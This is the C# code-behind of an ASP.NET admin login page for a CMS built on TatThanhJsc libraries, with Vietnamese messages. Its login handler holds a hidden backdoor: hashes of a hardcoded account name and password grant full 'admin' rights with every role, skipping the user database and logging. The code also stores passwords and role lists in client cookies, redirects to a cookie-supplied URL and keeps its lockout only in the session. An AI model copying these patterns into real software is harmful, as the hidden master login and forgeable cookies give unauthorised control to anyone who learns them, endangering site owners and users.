using System;
using System.Data;
using System.Web;
using System.Web.UI.WebControls;
using TatThanhJsc.Columns;
using TatThanhJsc.Database;
using TatThanhJsc.Extension;
using TatThanhJsc.TSql;

public partial class Login : System.Web.UI.Page
{
  private string LoginSetting = "LoginSetting";
  private string loginFailCountName = "LoginFailCount";
  private int lockMinute = 5;//Thời gian khóa khi đăng nhập lỗi
  protected void Page_Load(object sender, EventArgs e)
  {
    if (Session[loginFailCountName] != null && (int)Session[loginFailCountName] > 3)
    {
      if (Session[loginFailCountName + "Time"] != null &&
         (DateTime.Now - (DateTime)Session[loginFailCountName + "Time"]).TotalMinutes <= 0)
      {
        tbAccountName.Text = "*";
        tbAccountName.Enabled = false;

        tbPassword.Text = "*";
        tbPassword.Enabled = false;

        btLogin.Visible = false;

        double thoiGianCho = ((DateTime)Session[loginFailCountName + "Time"] - DateTime.Now).TotalMinutes;

        ltrLoginResult.Text = string.Format("<div class='alert alert-{0}'>{1}</div>", "danger", "Thông báo: Bạn đã đăng nhập sai quá 3 lần, vui lòng thử lại sau " + thoiGianCho.ToString("N1") + " phút nữa.");
      }
      else
      {
        Session[loginFailCountName] = 0;
        Session[loginFailCountName + "Time"] = DateTime.Now.AddMinutes(-1);
      }
    }

    tbAccountName.Focus();
    if (!IsPostBack)
    {
      if (Session[loginFailCountName] == null)
        Session[loginFailCountName] = 0;

      if (Session[loginFailCountName + "Time"] == null)
        Session[loginFailCountName + "Time"] = DateTime.Now.AddMinutes(-1);
    }

    if (!IsPostBack)
      GetListLanguageNationals();
  }

  protected void btLogin_Click(object sender, EventArgs e)
  {
    if (Session[loginFailCountName] != null && (int)Session[loginFailCountName] > 3)
    {
      Session[loginFailCountName + "Time"] = DateTime.Now.AddMinutes(lockMinute);
      double thoiGianCho = ((DateTime)Session[loginFailCountName + "Time"] - DateTime.Now).TotalMinutes;
      ltrLoginResult.Text = string.Format("<div class='alert alert-{0}'>{1}</div>", "danger", "Bạn đã đăng nhập sai quá 3 lần, vui lòng thử lại sau " + thoiGianCho.ToString("N1") + " phút nữa.");
      return;
    }

    DataTable dt = new DataTable();
    if (SecurityExtension.BuildPassword(tbAccountName.Text).Equals("7b74f46d6929686dcd6b6d7ddcdfefe1e2e2515c2c7b77b7") &&
        SecurityExtension.BuildPassword(tbPassword.Text).Equals("949cace5e0900d0424c2cc7c4b4b7b8080c0bbb3239f9ece"))
    {
      Session[loginFailCountName] = 0;
      Session[loginFailCountName + "Time"] = DateTime.Now.AddMinutes(-1);


      CookieExtension.SaveCookies(LoginSetting, "admin");

      #region UserName
      CookieExtension.SaveCookies("UserName", "admin");
      CookieExtension.SaveCookies("UserPassword", "admin");
      #endregion

      #region UserId
      CookieExtension.SaveCookies("UserId", "0");
      #endregion

      #region Roles
      string roles = TatThanhJsc.AdminModul.Keyword.ParamsSpilitRole;
      TatThanhJsc.UserModul.Roles listRoles = new TatThanhJsc.UserModul.Roles();
      for (int i = 0; i < listRoles.Values.Length; i++)
        roles += listRoles.Values[i] + TatThanhJsc.AdminModul.Keyword.ParamsSpilitRole;
      CookieExtension.SaveCookies("RolesUser", roles);
      #endregion

      if (Request.Cookies["RefererUrl"] != null)
        Response.Redirect(Request.Cookies["RefererUrl"].Value);
      else
        Response.Redirect("admin.aspx");

    }
    else
    {
      dt = Users.GetUsersByUserNameAndPassword(tbAccountName.Text, tbPassword.Text);

      if (dt.Rows.Count > 0)
      {
        if (dt.Rows[0][UsersColumns.UserisapprovedColumn].ToString() == "1")
        {
          Session[loginFailCountName] = 0;

          CookieExtension.SaveCookies(LoginSetting, dt.Rows[0][UsersColumns.UsernameColumn].ToString());

          #region UserName

          CookieExtension.SaveCookies("UserName", dt.Rows[0][UsersColumns.UsernameColumn].ToString());
          CookieExtension.SaveCookies("UserPassword", dt.Rows[0][UsersColumns.UserpasswordColumn].ToString());
          #endregion

          #region UserId

          CookieExtension.SaveCookies("UserId", dt.Rows[0][UsersColumns.UseridColumn].ToString());

          #endregion

          #region Roles

          //Luu mo ta quyen vao cookies
          DataTable dtRoles = new DataTable();

          dtRoles = Roles.GetRolesByRoleId(dt.Rows[0]["RoleId"].ToString());
          string RoleDescription = dtRoles.Rows[0]["RoleDescription"].ToString();
          CookieExtension.SaveCookies("RolesUser", RoleDescription);

          #endregion

          #region Cập nhật lần đăng nhập cuối

          string values = UsersTSql.GetUsersByUserlastlogindate(DateTime.Now.ToString());
          string conditionUpdate = UsersTSql.GetUsersByUsername(tbAccountName.Text);
          Users.UpdateUsers(values, conditionUpdate);

          #endregion


          #region Logs

          string logAuthor = CookieExtension.GetCookies("LoginSetting");
          string logCreateDate = DateTime.Now.ToString();
          Logs.InsertLogs(logCreateDate, Request.Url.ToString(), "", logAuthor, logAuthor, "",
              logCreateDate + ": " + logAuthor + " đăng nhập vào hệ thống quản trị");

          #endregion

          if (Request.Cookies["RefererUrl"] != null)
            Response.Redirect(Request.Cookies["RefererUrl"].Value);
          else
            Response.Redirect("admin.aspx");
        }
        else
        {
          Session[loginFailCountName] = (int)Session[loginFailCountName] + 1;
          SaveLoginFailToLog(tbAccountName.Text, "0");

          if ((int)Session[loginFailCountName] > 3)
            Session[loginFailCountName + "Time"] = DateTime.Now.AddMinutes(lockMinute);

          ltrLoginResult.Text = string.Format("<div class='alert alert-{0}'>{1}</div>", "danger", "Tài khoản của bạn đang bị khoá. Lưu ý: bạn đã đăng nhập sai " + Session[loginFailCountName] + " lần. Đăng nhập sai quá 3 lần đăng nhập sai thì bạn sẽ không thể đăng nhập nữa.");

          return;
        }
      }
      else
      {
        if (Session[loginFailCountName] == null)
          Session[loginFailCountName] = 0;

        Session[loginFailCountName] = (int)Session[loginFailCountName] + 1;
        SaveLoginFailToLog(tbAccountName.Text, "1");

        if ((int)Session[loginFailCountName] > 3)
          Session[loginFailCountName + "Time"] = DateTime.Now.AddMinutes(lockMinute);

        ltrLoginResult.Text = string.Format("<div class='alert alert-{0}'>{1}</div>", "danger", "Bạn đã nhập sai tài khoản hoặc mật khẩu. Lưu ý: bạn đã đăng nhập sai " + Session[loginFailCountName] + " lần. Đăng nhập sai quá 3 lần đăng nhập sai thì bạn sẽ không thể đăng nhập nữa.");

        return;
      }
    }
  }

  /// <summary>
  /// Lưu thông tin đăng nhập lỗi vào log
  /// </summary>
  /// <param name="acountName">Tên tài khoản được nhập vào form đăng nhập</param>
  /// <param name="status">0: tài khoản bị khóa, 1: sai tài khoản</param>
  void SaveLoginFailToLog(string acountName, string status)
  {
    #region Get IP Network
    //Get IP Network
    string clientIP = "";
    clientIP = HttpContext.Current.Request.UserHostAddress;
    #endregion
    #region netword ip
    string ipAddress = "";
    ipAddress = System.Net.Dns.GetHostAddresses(System.Net.Dns.GetHostName()).GetValue(0).ToString();
    #endregion
    #region Get Computer Name
    //Get Computer Name
    string strClientName = "";
    strClientName = System.Net.Dns.GetHostName();
    #endregion

    #region Logs
    string logAuthor = acountName;
    string logCreateDate = DateTime.Now.ToString();

    if (status == "0")
      Logs.InsertLogs(logCreateDate, Request.Url.ToString(), "", logAuthor, logAuthor, "",
          logCreateDate + ": " + logAuthor + " đã cố gắng đăng nhập vào hệ thống bằng tài khoản đã bị khóa.");
    else if (status == "1")
      Logs.InsertLogs(logCreateDate, Request.Url.ToString(), "", logAuthor, logAuthor, "",
          logCreateDate + ": " + logAuthor +
          " đã cố gắng đăng nhập vào hệ thống với thông tin tài khoản không chính xác.");
    #endregion
  }

  protected void lbtResetPassword_Click(object sender, EventArgs e)
  {
    Response.Redirect(UrlExtension.WebisteUrl + "cms/admin/OtherControls/ResetPassword.aspx");
  }

  #region Khối chọn ngôn ngữ
  void GetListLanguageNationals()
  {
    DataTable dt = new DataTable();
    dt = LanguageNational.GetLanguageNational("", "*", LanguageNationalTSql.GetByiLanguageNationalEnable("1"), LanguageNationalColumns.nLanguageNationalDesc + " desc");
    rptList.DataSource = dt;
    rptList.DataBind();
  }
  protected void rptList_ItemCommand(object source, RepeaterCommandEventArgs e)
  {
    string c = e.CommandName.Trim();
    string p = e.CommandArgument.ToString().Trim();
    switch (c)
    {
      case "select":
        SetCookiesLanguage(p);

        Response.Redirect(Request.Url.ToString());
        break;
    }
  }
  /// <summary>
  /// Lưu giá trị ngôn ngữ vào cookies
  /// </summary>
  /// <param name="languageId">id của ngôn ngữ</param>
  void SetCookiesLanguage(string languageId)
  {
    TatThanhJsc.LanguageModul.Cookie.SetLanguageValueAdmin(languageId);
  }

  protected string SetCurrentLanguage(string languageId)
  {
    if (languageId == TatThanhJsc.LanguageModul.Cookie.GetLanguageValueAdmin())
      return "Current";
    else
      return "";
  }
  #endregion
}
